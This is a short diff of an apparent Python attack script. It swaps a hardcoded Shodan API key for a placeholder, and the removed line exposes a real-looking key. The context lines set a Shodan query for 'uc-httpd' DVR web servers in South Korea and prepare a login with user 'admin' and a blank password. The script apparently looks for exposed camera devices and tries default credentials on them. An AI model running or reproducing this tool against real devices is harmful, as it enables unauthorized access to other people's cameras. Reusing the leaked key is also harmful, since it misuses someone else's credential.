@@ -3,7 +3,7 @@ from colorama import Fore
 import requests
 from bs4 import BeautifulSoup
  
-SHODAN_API_KEY = 'GKja8yvDZh5B1gDF6jhz64hTJkPtOCUV' 
+SHODAN_API_KEY = 'Your Shodan API KEy' 
  
 query='uc-httpd country:KR'
 data=(('command','login'),('username','admin'),('password',''))
